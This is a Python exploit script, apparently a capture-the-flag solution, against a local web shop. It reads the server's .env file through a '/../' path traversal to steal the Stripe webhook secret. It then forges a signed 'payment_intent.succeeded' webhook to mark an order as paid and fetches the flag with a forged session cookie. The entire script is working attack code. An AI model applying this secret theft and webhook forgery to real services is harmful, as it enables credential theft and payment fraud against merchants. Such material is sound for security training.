#!/usr/bin/env python3

import time
import stripe
import requests
import json

BASE_URL = 'http://localhost:8000'


def generate_header(payload: str, secret: str) -> str:
    timestamp = int(time.time())
    scheme = stripe.WebhookSignature.EXPECTED_SCHEME
    payload_to_sign = f"{timestamp}.{payload}"
    signature = stripe.WebhookSignature._compute_signature(
        payload_to_sign, secret)
    return f"t={timestamp},{scheme}={signature}"


s = requests.Session()

url = BASE_URL + '/../.env'
req = requests.Request(method='GET', url=url)
prep = req.prepare()
prep.url = url
r = s.send(prep, verify=False)

env_leak = r.text
stripe_webhook_secret = env_leak.strip().split('=')[1]

print(f'Webhook secret: {stripe_webhook_secret}')

r = s.post(BASE_URL + '/buy-flag', allow_redirects=False)

print(f'Shop session: {s.cookies["shop_session"]}')

client_reference_id = 'fa' * 32
payload = json.dumps({
    'type': 'payment_intent.succeeded',
    'client_reference_id': client_reference_id,
    'livemode': True
})
print(payload)

stripe_signature = generate_header(payload, stripe_webhook_secret)
print(stripe_signature)

r = s.post(BASE_URL + '/stripe_webhook',
           headers={
               'stripe-signature': stripe_signature,
               'Content-Type': 'text/plain'
           },
           data=payload)
print(r.text)

r = s.get(BASE_URL + '/flag',
          headers={
              'Cookie': f'shop_session={client_reference_id}',
          })
flag = r.text.strip()

print(f'Flag: {flag}')
